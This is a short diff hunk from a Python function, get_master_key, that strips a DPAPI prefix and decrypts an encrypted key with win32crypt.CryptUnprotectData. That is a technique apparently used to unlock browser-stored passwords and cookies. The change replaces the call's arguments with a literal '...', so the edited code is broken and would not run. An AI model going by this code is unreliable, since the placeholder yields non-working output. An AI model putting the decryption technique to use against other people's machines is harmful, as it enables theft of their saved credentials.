@@ -34,13 +34,7 @@ def get_master_key():
     # Remove DPAPI prefix
     encrypted_key = encrypted_key[5:]
 
-    master_key = win32crypt.CryptUnprotectData(
-        encrypted_key,
-        None,
-        None,
-        None,
-        0
-    )[1]
+    master_key = win32crypt.CryptUnprotectData(...)[1]
 
     return master_key
 
